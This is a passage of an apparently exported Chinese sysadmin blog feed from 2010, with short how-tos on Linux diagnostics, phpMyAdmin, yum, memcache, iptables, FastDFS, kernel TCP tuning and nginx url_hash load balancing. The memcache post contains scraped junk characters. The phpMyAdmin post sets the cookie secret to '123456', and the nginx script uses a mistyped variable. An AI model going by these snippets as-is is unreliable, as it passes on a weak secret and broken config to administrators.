ID必须一致，否则报文将不能正确传输。  </p><p>access  : 只需记住这八个字“进口打标，出口解标”。<br>trunk：<br>             a.当一个数据帧要从trunk端口发送出去，若交换机发现该以太网帧中tag标记所指的vlan与trunk端口的本地vlan相同，则解标。其余情况一律不解标。<br>             b.当收到一个原始以太网帧（无携带tag时），打标（打上本地vlan的标签）（cisco  ISL不存在解标的情况）<br>hybrid： 则是允许多个vlan不打标。<br>vlan1 成为一个特殊的vlan是因为第二层设备需要一个默认的vlan作为他们端口的归属，包括他们的管理端口。 native vlan的作用是给协议报文提供一个专用的vlan。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> access、hybrid和trunk三种模式的理解 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>IOWait高的一些处理方法</title>
      <link href="/2010/12/09/iowait-s-high-handling-methods/"/>
      <url>/2010/12/09/iowait-s-high-handling-methods/</url>
      <content type="html"><![CDATA[<p>抓哪个进程干坏事前要先停掉syslog<br>/etc/init.d/rsyslog stop<br>echo 1 &gt; /proc/sys/vm/block_dump<br>dmesg | egrep “READ|WRITE|dirtied” | egrep -o ‘([a-zA-Z]*)’ | sort | uniq -c | sort -rn | head  </p><p>#类似如下数据  </p><p>#1423 kjournald  </p><p>#1075 pdflush  </p><p>#209 indexer  </p><p>#3 cronolog  </p><p>#1 rnald  </p><p>#1 mysqld  </p><p>#不要忘记在抓完之后关掉block_dump和启动syslog<br>echo 0 &gt; /proc/sys/vm/block_dump<br>/etc/init.d/rsyslog start</p><p>或者dmesg | awk  ‘/(READ|WRITE|dirtied)/ {process[$1]++} END {for (x in process) print process[x],x}’|sort -nr|awk ‘{print $2 “ “$1}’|head -n 10</p><p>查看进程状态<br>ps -eo pid,user,wchan=WIDE-WCHAN-COLUMN -o s,cmd|awk ‘ $4 ~ /D/ {print $0}’<br>lsof -p $pid</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iowait高的一些处理方法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SecureCRT rz 上传rar,gif文件不正确及上传大容量文件失败问题解决</title>
      <link href="/2010/12/09/securecrt-rz-upload-rar-gif-files-incorrectly-and-upload-large-capacity-file-failed-to-resolve/"/>
      <url>/2010/12/09/securecrt-rz-upload-rar-gif-files-incorrectly-and-upload-large-capacity-file-failed-to-resolve/</url>
      <content type="html"><![CDATA[<p><strong>linux 与 windows 文件传输：rz/sz  </strong>ZModem is a full-duplex file transfer protocol that supports fast data transfer rates and effective error detection. ZModem is very user friendly, allowing either the sending or receiving party to initiate a file transfer. ZModem supports multiple file (”batch”) transfers, and allows the use of wildcards when specifying filenames. ZModem also supports resuming most prior ZModem file transfer attempts.</p><p>rz，sz是便是Linux/Unix同Windows进行ZModem文件传输的命令行工具</p><p>windows端需要支持ZModem的telnet/ssh客户端（比如SecureCRT）</p><p>运行命令rz，即是接收文件，SecureCRT就会弹出文件选择对话框，选好文件之后关闭对话框，文件就会上传到当前目录</p><p><strong>注意：单独用rz会有两个问题：上传中断、上传文件变化（md5不同），解决办法是上传是用rz -be，并且去掉弹出的对话框中“Upload files as ASCII”前的勾选。</strong></p><p><strong>-a, –ascii</strong><br><strong>-b, –binary 用binary的方式上传下载，不解释字符为ascii<br>-e, –escape</strong> <strong>强制escape 所有控制字符，比如Ctrl+x，DEL等</strong></p><p>rar,gif等文件文件采用 -b 用binary的方式上传。</p><p>文件比较大而上传出错的话，采用参数 -e</p><p>如果用不带参数的rz命令上传大文件时，常常上传一半就断掉了，很可能是rz以为上传的流中包含某些特殊控制字符，造成rz提前退出。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rz上传出错问题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>命令行查看memcache状态</title>
      <link href="/2010/12/08/the-command-line-checks-the-status-of-the-memcache/"/>
      <url>/2010/12/08/the-command-line-checks-the-status-of-the-memcache/</url>
      <content type="html"><![CDATA[<p><strong>memcache</strong>的运行状态可以方便的用stats命令显示。51Testing软件测试网2E6e”K?a,v%F u j!d<br>首先用telnet 127.0.0.1 11211这样的命令连接上memcache，然后直接输入stats就可以得到当前memcache的状态。  </p><h1 id="Q-s-Ix-l-Hh7F0这些状态的说明如下：51Testing软件测试网2dj-W-amp-pt-s-Bk"><a href="#Q-s-Ix-l-Hh7F0这些状态的说明如下：51Testing软件测试网2dj-W-amp-pt-s-Bk" class="headerlink" title=";Q s,Ix+l)Hh7F0这些状态的说明如下：51Testing软件测试网2dj(W&amp;pt-} s+Bk"></a>;Q s,Ix+l)Hh7F0这些状态的说明如下：51Testing软件测试网2dj(W&amp;pt-} s+Bk</h1><p>pid</p><p>memcache服务器的进程ID</p><p>uptime</p><p>服务器已经运行的秒数</p><p>time</p><p>服务器当前的unix时间戳</p><p>version</p><p>memcache版本</p><p>pointer_size</p><p>当前<strong>操作系统</strong>的指针大小（32位系统一般是32bit）</p><p>rusage_user</p><p>进程的累计用户时间</p><p>rusage_system</p><p>进程的累计系统时间</p><p>curr_items</p><p>服务器当前存储的items数量</p><p>total_items</p><p>从服务器启动以后存储的items总数量</p><p>bytes</p><p>当前服务器存储items占用的字节数</p><p>curr_connections</p><p>当前打开着的连接数</p><p>total_connections</p><p>从服务器启动以后曾经打开过的连接数</p><p>connection_structures</p><p>服务器分配的连接构造数</p><p>cmd_get</p><p>get命令（获取）总请求次数</p><p>cmd_set</p><p>set命令（保存）总请求次数</p><p>get_hits</p><p>总命中次数</p><p>get_misses</p><p>总未命中次数</p><p>evictions</p><p>为获取空闲内存而删除的items数（分配给memcache的空间用满后需要删除旧的items来得到空间分配给新的items）</p><p>bytes_read</p><p>总读取字节数（请求字节数）</p><p>bytes_written</p><p>总发送字节数（结果字节数）</p><p>limit_maxbytes</p><p>分配给memcache的内存大小（字节）</p><p>threads</p><p>当前线程数</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令行查看memcache状态 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux下 取得前3天前1小时前一分钟的时间</title>
      <link href="/2010/12/07/a-minute-before-the-first-three-days-of-linux/"/>
      <url>/2010/12/07/a-minute-before-the-first-three-days-of-linux/</url>
      <content type="html"><![CDATA[<p>Linux下 取得前3天前1小时前一分钟的时间<br>date +%Y%m%d%H%M$s -d “3 days ago 1 hours ago 1 minutes ago” ;date +%Y%m%d%H%M$s<br>200904110904<br>200904141005</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux下 </tag>
            
            <tag> 取得前3天前1小时前一分钟的时间 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>phpmyadmin几个错误的解决</title>
      <link href="/2010/12/06/phpmyadmin-has-several-wrong-solutions/"/>
      <url>/2010/12/06/phpmyadmin-has-several-wrong-solutions/</url>
      <content type="html"><![CDATA[<p>首先进入到phpmyadmin首页后下方有三个错误提示，解决：  </p><p>1）链接表的附加功能尚未激活的解决方法<br>1):libraries/config.default.php,将$cfg[‘PmaNoRelation_DisableWarning’]的值改为ture。<br>2):打开phpmyadmin文件夹下的libraries文件夹，找到名为config.default.php的文件，windows下使用文本编辑工具，建议使用Editplus之类的工具，linux下直接vi）打开该文件。对其进行修改。</p><p><strong>修改前：</strong></p><p> $cfg[‘Servers’][$i][‘pmadb’] = ‘’;</p><p>$cfg[‘Servers’][$i][‘bookmarktable’] = ‘’;</p><p>$cfg[‘Servers’][$i][‘relation’] = ‘’;</p><p>$cfg[‘Servers’][$i][‘table_info’] = ‘’;</p><p>$cfg[‘Servers’][$i][‘table_coords’] = ‘’;</p><p>$cfg[‘Servers’][$i][‘pdf_pages’] = ‘’;</p><p>$cfg[‘Servers’][$i][‘column_info’] = ‘’;</p><p>$cfg[‘Servers’][$i][‘history’] = ‘’;</p><p>$cfg[‘Servers’][$i][‘tracking’] = ‘’</p><p><strong>修改后：</strong></p><p>$cfg[‘Servers’][$i][‘pmadb’] = ‘phpmyadmin’;</p><p>$cfg[‘Servers’][$i][‘bookmarktable’] = ‘pma_bookmark’;</p><p>$cfg[‘Servers’][$i][‘relation’] = ‘pma_relation’;</p><p>$cfg[‘Servers’][$i][‘table_info’] = ‘pma_table_info’;</p><p>$cfg[‘Servers’][$i][‘table_coords’] = ‘pma_table_coords’;</p><p>$cfg[‘Servers’][$i][‘pdf_pages’] = ‘pma_pdf_pages’;</p><p>$cfg[‘Servers’][$i][‘column_info’] = ‘pma_column_info’;</p><p>$cfg[‘Servers’][$i][‘history’] = ‘pma_history’;</p><p>$cfg[‘Servers’][$i][‘tracking’] = ‘pma_tracking’;</p><p>修改完后，退出phpmyadmin，重新登陆就会发现“链接表的附加功能尚未激活”的提示没有了。</p><p><strong>2）没有找到 PHP 扩展 mbstring….的解决</strong></p><p>在win下，只要到配置文件里把mbstring.dll前面的分号去掉，并把文件放到相应的地方就可以了</p><p><strong>win系统:</strong><br>打开c:\windows\php.ini<br>把<br>;extension=php_mbstring.dll<br>改成<br>extension=php_mbstring.dll</p><p><strong>在linux下</strong>，在编译安装PHP的时候加上参数就可以了。<br>–enable-mbstring=all  </p><p><strong>3）配置文件现在需要一个短语密码</strong></p><p>解决方法：<br>    1、将 <strong>phpMyAdmin/libraries/config.default.php</strong>中的<br>    $cfg[‘blowfish_secret’] = ‘’; 改成 $cfg[‘blowfish_secret’] = ‘123456’; (注：其中的’123456′为随意的字符)<br>    2、在<strong>phpMyAdmin/config.sample.inc.php</strong>，18行</p><pre><code>$cfg[&apos;blowfish\_secret&apos;] = &apos;&apos;; 改成 $cfg[&apos;blowfish\_secret&apos;] = &apos;123456&apos;; (注：其中的’123456′为随意的字符)这个密码用于Cookies的加密，以免多个PhpMyAdmin或者和其他程序共用Cookies时搞混。做好以上两步，刷新网页，OK</code></pre><p><strong>4）有时正确的输入用户名密码，仍然登陆不了，#2002 无法登录 MySQL 服务器</strong></p><p>查到了一个网友的说明,地址为<a href="http://xiaoniba.net/html/jiaocheng/SQL/2010/0908/565.html" target="_blank" rel="noopener">http://xiaoniba.net/html/jiaocheng/SQL/2010/0908/565.html</a>,</p><p>要将 config.inc.php 中<br>$cfg[‘Servers’][$i][‘host’] = ’localhost’;<br>改成 $cfg[‘Servers’][$i][‘host’] = ’127.0.0.1′;<br>还要添加<br>$cfg[‘Servers’][$i][‘hide_db’] = ‘information_schema’;//使用登陆后看不见information_schema数据库</p><p>于是把配置文件里的host改成127.0.0.1，再连接，好了，连接正常。（$cfg[‘Servers’][$i][‘hide_db’] = ‘information_schema’;这一句加不加都无所谓，不影响连接数据库）</p><p>为什么在linux下localhost就是不能连接呢？查mysql官方文档，有这样的句话：</p><p>如果未指定指定主机名或指定了特殊的主机名localhost，将使用Unix套接字。</p><p>Unix套接字默认为/tmp/mysql.sock，而本机并没有配置这样的套接字文件，所以自然是连接失败了。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链接表的附加功能尚未激活的解决方法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Warning: RPMDB altered outside of yum.的解决办法</title>
      <link href="/2010/12/03/warning-rpmdb-change-outside-of-yum/"/>
      <url>/2010/12/03/warning-rpmdb-change-outside-of-yum/</url>
      <content type="html"><![CDATA[<p>错误提示： Warning: RPMDB altered outside of yum  </p><p>解决办法： 删除yum的历史记录<br>rm -rf /var/lib/yum/history/*.sqlite<br>上面的命令可能需要root权限才能执行</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> altered </tag>
            
            <tag> of </tag>
            
            <tag> outside </tag>
            
            <tag> rpmdb </tag>
            
            <tag> warning: </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>如何查看Linux内核是否为64位版本？</title>
      <link href="/2010/12/03/how-do-i-check-if-the-linux-kernel-is-64-bit/"/>
      <url>/2010/12/03/how-do-i-check-if-the-linux-kernel-is-64-bit/</url>
      <content type="html"><![CDATA[<p>方法非常简单，LINUX提供了一个查看配置的命令（实际有相应的库函数）getconf，使用它即可，方法如下：<br>getconf LONG_BIT<br>或<br>file /sbin/init<br>如果返回64，就表示为64位内核，否则应当返回32。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#file /sbin/init  </span><br><span class="line">/sbin/init: ELF &lt;b&gt;;32-bit&lt;/b&gt;; LSB executable, Intel 80386......</span><br></pre></td></tr></table></figure></p><p>即是32位的 linux, 如是64位的, 显示的是 64-bit</p><p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file /sbin/init  </span><br><span class="line">/sbin/init: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.9, dynamically linked (uses shared libs), for GNU/Linux 2.6.9, stripped</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 如何查看linux内核是否为64位版本？ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>强制位与冒险位</title>
      <link href="/2010/12/03/mandatory-position-and-risk-position/"/>
      <url>/2010/12/03/mandatory-position-and-risk-position/</url>
      <content type="html"><![CDATA[<p>  除了读写执行权限以外，ext3文件系统还支持强制位（setuid 和setgid)与冒险位(sticky)的特别权限。针对u，g，o，分别有set uid，set gid，及sticky。强制位与冒险位添加在执行权限的位置上。如果该位置上原已有执行权限。则强制位与冒险位以小写字母的方式表示，否则，以大写字母表示。set uid与set gid在u和g的x位置上各采用一个s，sticky使用一个t。<br>    强制位对文件的作用<br>    在可执行文件上，用户可以添加set uid和set gid。默认情况下，用户执行一个指令，会以该用户的身份来运行进程。指令文件上的强制位，可以让用户执行的指令，以指令文件的拥有者或所属组的身份运行进程。这里有一个很好的例子。你管理着几个大型的数据库系统，而对它们进行备份需要有系统管理权限。你写了几个脚本，并设置了它们的suid，这样你指定的一些用户只要执行这些脚本就能够完成相应的工作，而无须以数据库管理员的身份登录，以免不小心破坏了数据库服务器。通过执行这些脚本，他们可以完成数据库备份及其他管理任务，而且在这些脚本运行结束之后，他们就又回复到他们作为普通用户的权限。另一个例子是/bin/passwd ，要读写/etc/passwd文件需要超级用户权限，但一般用户也需要随时可以改变自己的密码，所以/bin/passwd就设置了suid，当用户改自己密码的时侯就拥有了超级用户权限<br>    强制位对目录的作用<br>    默认情况下，用户建立的文件属于用户当前所在的组。目录上设置了setgid，表示在此目录中，任何人建立的文件，都会属于目录所属的组。<br>    冒险位对目录的作用<br>    默认情况下，如果一个目录上有w和x权限，则任何人可以在此目录中建立与删除文件。一旦目录上设置了冒险位，则表示在此目录中，只有文件的拥有者、目录的拥有者与系统管理员可以删除文件。<br>    设置强制位与冒险位<br>    用户可以用chmod指令来为文件设置强制位与冒险位。<br>    set uid：chmod u+s 文件名<br>    set gid：chmod g+s 文件名<br>    sticky：chmod o+t 文件名<br>    强制位与冒险位也可以通过一个数字加和，放在读写执行的三位数字前来指定。<br>    4(set uid)<br>    2(set gid)<br>    1(sticky)</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 强制位与冒险位 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux使用iptables实现(邮件)端口重定向</title>
      <link href="/2010/12/03/linux-uses-the-iptables-implementation-mail-port-redirection/"/>
      <url>/2010/12/03/linux-uses-the-iptables-implementation-mail-port-redirection/</url>
      <content type="html"><![CDATA[<p>由于某些原因，对方（服务器或者客户端）无法访问我邮件服务器的SMTP(25)端口，比如对方防火墙等原因禁止了如果不启用SSL的话，将无法连接SMTP端口，那么如果想让对方可以和我这边的邮件服务器通讯的话，我这边可以做一个端口重定向，比如，我将访问本机2525端口的tcp连接重定向到25端口，那么只要对方访问我的2525端口，那么他就像和我的25端口通讯那样了～  </p><p>/sbin/iptables -t nat -I PREROUTING -p tcp –dport 2525 -j REDIRECT –to-port 25<br>iptables博大精深～闲下来的话，可以好好研究研究～</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux使用iptables实现(邮件)端口重定向 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>FastDFS FAQ</title>
      <link href="/2010/12/02/fastdfs-faq/"/>
      <url>/2010/12/02/fastdfs-faq/</url>
      <content type="html"><![CDATA[<p>定位问题首先要看日志文件。出现问题时，先检查返回的错误号和错误信息。然后查看服务器端日志，相信可以定位到问题所在。<br>1. FastDFS需要的编译和运行环境是怎样的？<br>FastDFS Server仅支持unix系统，在Linux和FreeBSD测试通过。在Solaris系统下网络通信方面有些问题。<br>编译需要的其他库文件有pthread和libevent。<br>pthread使用系统自带的即可。<br>对libevent的版本要求为1.4.x，建议使用最新的stable版本，如1.4.14b。<br>注意，千万不要使用libevent 2.0及以上版本。<br>2. 有人在生产环境中使用FastDFS吗？<br>答案是肯定的。据我所知，至少有20家公司在使用FastDFS，其中有好几家是做网盘的公司。<br>3. 启动storage server时，一直处于僵死状态。<br>A：启动storage server，storage将连接tracker server，如果连不上，将一直重试。直到连接成功，启动才算真正完成。<br>出现这样情况，请检查连接不上tracker server的原因。<br>4. 执行fdfs_test或fdfs_test1上传文件时，服务器返回错误号2<br>错误号表示没有ACTIVE状态的storage server。可以执行fdfs_monitor查看服务器状态。<br>5. 如何让server进程退出运行？<br>直接kill即可让server进程正常退出，可以使用killall命令，例如：<br>killall fdfs_trackerd<br>killall fdfs_storaged<br>也可以使用FastDFS自带的stop.sh脚本，如：<br>/usr/local/bin/stop.sh  /usr/local/bin/fdfs_storaged /etc/fdfs/storage.conf<br>stop.sh只会停止命令行（包括参数）完全相同的进程。<br>千万不要使用-9参数强杀，否则可能会导致binlog数据丢失的问题。<br>6. 如何重启server进程？<br>可以kill掉server进程后，执行启动命令行。如：<br>killall fdfs_trackerd<br>/usr/local/bin/fdfs_trackerd /etc/fdfs/tracker.conf<br>或者直接使用FastDFS自带的restart.sh脚本，如：<br>/usr/local/bin/restart.sh  /usr/local/bin/fdfs_trackerd /etc/fdfs/tracker.conf</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> faq </tag>
            
            <tag> fastdfs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>To support over 500k users, you *need*</title>
      <link href="/2010/11/30/to-support-over-500k-users-you-need/"/>
      <url>/2010/11/30/to-support-over-500k-users-you-need/</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">About tuning, I prefer to not fully disclose them because servers are targets of many attacks, so it’s better not help hackers.</span><br><span class="line"></span><br><span class="line">The most touchy thing is the IP route cache : You have to tune it or else the machine drops many connections</span><br><span class="line"></span><br><span class="line">(hint : rhash_entries=… in the boot append string)  </span><br><span class="line">hints :  </span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/route/gc_interval  </span><br><span class="line">echo 150 &gt;/proc/sys/net/ipv4/route/gc_timeout  </span><br><span class="line">echo 2 &gt;/proc/sys/net/ipv4/route/gc_elasticity</span><br><span class="line"></span><br><span class="line">\- Use of hugeTLB pages  </span><br><span class="line">hint :  </span><br><span class="line">echo xxx &gt;/proc/sys/vm/nr_hugepages</span><br><span class="line"></span><br><span class="line">Tune tcp :  </span><br><span class="line">echo “4096 49152 131072″ &gt;/proc/sys/net/ipv4/tcp_wmem  </span><br><span class="line">echo xxxx &gt;/proc/sys/net/ipv4/tcp\_max\_syn_backlog  </span><br><span class="line">echo xxxx &gt;/proc/sys/net/core/somaxconn  </span><br><span class="line">echo 1200000 &gt; /proc/sys/net/ipv4/tcp\_max\_tw_buckets  </span><br><span class="line">echo 7 &gt;/proc/sys/net/ipv4/tcp_retries2  </span><br><span class="line">echo “600000 650000 700000″ &gt;/proc/sys/net/ipv4/tcp_mem  </span><br><span class="line">echo 0 &gt;/proc/sys/net/ipv4/tcp_timestamps  </span><br><span class="line">echo 0 &gt;/proc/sys/net/ipv4/tcp\_window\_scaling  </span><br><span class="line">echo 0 &gt;/proc/sys/net/ipv4/tcp_sack  </span><br><span class="line">echo 330000 &gt;/proc/sys/net/ipv4/tcp\_max\_orphans  </span><br><span class="line">echo “10000 62000″ &gt;/proc/sys/net/ipv4/ip\_local\_port_range</span><br><span class="line"></span><br><span class="line">others :  </span><br><span class="line">echo 1300000 &gt;/proc/sys/fs/file-max</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> to </tag>
            
            <tag> 500k </tag>
            
            <tag> over </tag>
            
            <tag> support </tag>
            
            <tag> users </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>解决Python升级为2.5高版本后yum不能使用的问题</title>
      <link href="/2010/11/30/solve-the-problem-that-yum-can-t-use-after-python-upgrade-to-2-5-high/"/>
      <url>/2010/11/30/solve-the-problem-that-yum-can-t-use-after-python-upgrade-to-2-5-high/</url>
      <content type="html"><![CDATA[<p># yum<br>There was a problem importing one of the Python modules<br>required to run yum. The error leading to this problem was:  </p><p>   No module named yum  </p><p>Please install a package which provides this module, or<br>verify that the module is installed correctly.  </p><p>It’s possible that the above module doesn’t match the<br>current version of Python, which is:<br>2.4.3 (#1, Oct 14 2009, 01:52:50)<br>[GCC 4.1.2 20080704 (Red Hat 4.1.2-44)]  </p><p>If you cannot solve this problem yourself, please go to<br>the yum faq at:  </p><p><a href="http://wiki.linux.duke.edu/YumFaq" target="_blank" rel="noopener">http://wiki.linux.duke.edu/YumFaq</a></p><p>=======================</p><p>直接修改 vim /usr/bin/yum<br>将 #!/usr/bin/python 修改为 #!/usr/bin/python2.4</p><p>上面是假设你是从2.4升级到 2.5</p><p>其实这个时候 你可以 ls /usr/lib/python2.4/site-packages/yum<br>这个文件夹是否存在的</p><p>然后  /usr/bin/python2.4<br>Python 2.4.3 (#1, May 24 2008, 13:47:28)<br>[GCC 4.1.2 20070626 (Red Hat 4.1.2-14)] on linux2<br>Type “help”, “copyright”, “credits” or “license” for more information.  </p><blockquote><blockquote><p>> import yum</p></blockquote></blockquote><p>成功鸟</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解决python升级为2.5高版本后yum不能使用的问题 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>将nginx配置成url_hash转发方式</title>
      <link href="/2010/11/29/configure-nginx-to-be-the-url-hash-forwarding-method/"/>
      <url>/2010/11/29/configure-nginx-to-be-the-url-hash-forwarding-method/</url>
      <content type="html"><![CDATA[<p>所需软件名称及版本：<br>pcre-8.02.tar.gz<br>nginx-0.7.58.tar.gz<br>Nginx_upstream_hash-0.3.1.tar.gz</p><p>1、安装pcre</p><p>Java代码</p><ol><li>tar -zxvf pcre-8.02.tar.gz  </li><li>cd pcre-8.02/  </li><li>./configure  </li><li>make &amp;&amp; make install   </li></ol><p>tar -zxvf pcre-8.02.tar.gz cd pcre-8.02/ ./configure make &amp;&amp; make install </p><p>2、给nginx安装url_hash补丁</p><p>Java代码</p><ol><li>tar -zxvf nginx-0.7.58.tar.gz  </li><li>tar -zxvf Nginx_upstream_hash-0.3.1.tar.gz  </li><li>cd nginx-0.7.58/  </li><li>patch -p0 &lt; /var/tmp/loojoy/nginx_upstream_hash-0.3.1/nginx.patch  </li></ol><p>tar -zxvf nginx-0.7.58.tar.gz tar -zxvf Nginx_upstream_hash-0.3.1.tar.gz cd nginx-0.7.58/ patch -p0 &lt; /var/tmp/loojoy/nginx_upstream_hash-0.3.1/nginx.patch</p><p>3、安装nginx</p><p>Java代码</p><ol><li>groupadd www  </li><li>useradd www -g www  </li><li>./configure –prefix=/usr/local/webserver/nginx \  </li><li>–user=www \  </li><li>–group=www \  </li><li>–add-module=/var/tmp/loojoy/nginx_upstream_hash-0.3.1 \  </li><li>–with-http_ssl_module \  </li><li>–with-http_stub_status_module   </li></ol><p>groupadd www useradd www -g www ./configure –prefix=/usr/local/webserver/nginx \ –user=www \ –group=www \ –add-module=/var/tmp/loojoy/nginx_upstream_hash-0.3.1 \ –with-http_ssl_module \ –with-http_stub_status_module </p><p>4、检查nginx生成的配置文件是否正确</p><p>Java代码</p><ol><li><p>/usr/local/webserver/nginx/sbin/nginx -t  </p><p>/usr/local/webserver/nginx/sbin/nginx -t </p><p>5、启动nginx<br>若nginx.conf检查通过，则启动nginx。</p></li></ol><p>Java代码</p><ol><li>/usr/local/webserver/nginx/sbin/nginx  </li></ol><p>/usr/local/webserver/nginx/sbin/nginx </p><p>6、查看端口80<br>netstat -ant</p><p>7、通过浏览器访问：<br><a href="http://your_nginx_server_ip/" target="_blank" rel="noopener">http://your_nginx_server_ip/</a><br>若可以正常访问，则nginx安装成功。</p><p>8、修改nginx的配置文件如下:</p><p>Java代码</p><ol><li>——————-[S]url_hash转发方式nginx.conf[S]——————–  </li><li>user www www;  </li><li>worker_processes 10;  </li><li>error_log logs/error.log;  </li><li>#error_log logs/error.log notice;  </li><li>#error_log logs/error.log info;  </li><li>#pid        logs/nginx.pid;  </li><li>worker_rlimit_nofile 51200;           </li><li>events  </li><li>{  </li><li>use epoll;  </li><li>worker_connections 51200;  </li><li><p>}  </p></li><li><p>http  </p></li><li>{  </li><li>include       mime.types;  </li><li>default_type application/octet-stream;  </li><li>keepalive_timeout 120;  </li><li><p>tcp_nodelay on;  </p></li><li><p>upstream your.website.name{  </p></li><li>server   your.tomcat.server.ip1:8080 ;  </li><li><p>server   your.tomcat.server.ip1:8080 ;  </p></li><li><p>hash $request_uri;                   </p></li><li><p>}  </p></li><li><p>server  </p></li><li>{  </li><li>listen 80;  </li><li><p>server_name your.website.name;  </p></li><li><p>location / {  </p></li><li>proxy_pass        <a href="http://your.website.name" target="_blank" rel="noopener">http://your.website.name</a>;</li><li>proxy_set_header   Host             $host;  </li><li>proxy_set_header   X-Real-IP        $remote_addr;  </li><li>proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;  </li><li><p>}  </p></li><li><p>log_format www_gjw_com ‘$remote_addr - $remote_user [$time_local] $request ‘</p></li><li>‘“$status” $body_bytes_sent “$http_referer” ‘</li><li>‘“$http_user_agent” “$http_x_forwarded_for”‘;  </li><li><p>#access_log /data1/logs/<a href="http://www.log" target="_blank" rel="noopener">www.log</a> www_gjw_com;  </p></li><li><p>location /nginx_status {  </p></li><li>stub_status on;                                  </li><li>access_log   off;  </li><li>}  </li><li>}  </li><li><p>}        </p></li><li><p>——————-[E]url_hash转发方式nginx.conf[E]——————–  </p></li></ol><p>——————-[S]url_hash转发方式nginx.conf[S]——————– user www www; worker_processes 10; error_log logs/error.log; #error_log logs/error.log notice; #error_log logs/error.log info; #pid        logs/nginx.pid; worker_rlimit_nofile 51200;          events {       use epoll;       worker_connections 51200; }  http {       include       mime.types;       default_type application/octet-stream;       keepalive_timeout 120;       tcp_nodelay on;        upstream your.website.name{               server   your.tomcat.server.ip1:8080 ;               server   your.tomcat.server.ip1:8080 ;                hash $request_uri;                        }        server       {               listen 80;               server_name your.website.name;                location / {                        proxy_pass        <a href="http://your.website.name" target="_blank" rel="noopener">http://your.website.name</a>;                        proxy_set_header   Host             $host;                        proxy_set_header   X-Real-IP        $remote_addr;                        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;               }                log_format www_gjw_com ‘$remote_addr - $remote_user [$time_local] $request ‘                                 ‘“$status” $body_bytes_sent “$http_referer” ‘                                 ‘“$http_user_agent” “$http_x_forwarded_for”‘;               #access_log /data1/logs/<a href="http://www.log" target="_blank" rel="noopener">www.log</a> www_gjw_com;                location /nginx_status {                    stub_status on;                                                    access_log   off;               }    } }        ——————-[E]url_hash转发方式nginx.conf[E]——————– </p><p>9、添加nginx启动、关闭、重启脚本</p><p>Java代码</p><ol><li><p>——————-[S]url_hash转发方式nginx启动、关闭脚本[S]——————–  </p></li><li><p>#!/bin/sh  </p></li><li><p>CWD=`pwd`     </p></li><li><p>case $1 in  </p></li><li>start)  </li><li>/usr/local/webserver/nginx/sbin/nginx  </li><li>;;  </li><li>stop)  </li><li>kill -2 <code>ps -ef|grep &quot;/usr/local/webserver/nginx/sbin/nginx&quot;|grep -v &quot;grep&quot;|awk &#39;{print $2}&#39;</code>  </li><li>;;  </li><li>restart)  </li><li>cd “$CMD”</li><li>$0 stop  </li><li>$0 start  </li><li>;;  </li><li>*)  </li><li>echo $”Usage: $0 {start|stop|restart}”</li><li>exit 1</li><li>esac  </li><li><p>exit 0</p></li><li><p>——————-[E]url_hash转发方式nginx启动、关闭脚本[E]——————–  </p></li></ol><p>——————-[S]url_hash转发方式nginx启动、关闭脚本[S]——————–  #!/bin/sh  CWD=`pwd`     case $1 in         start)                         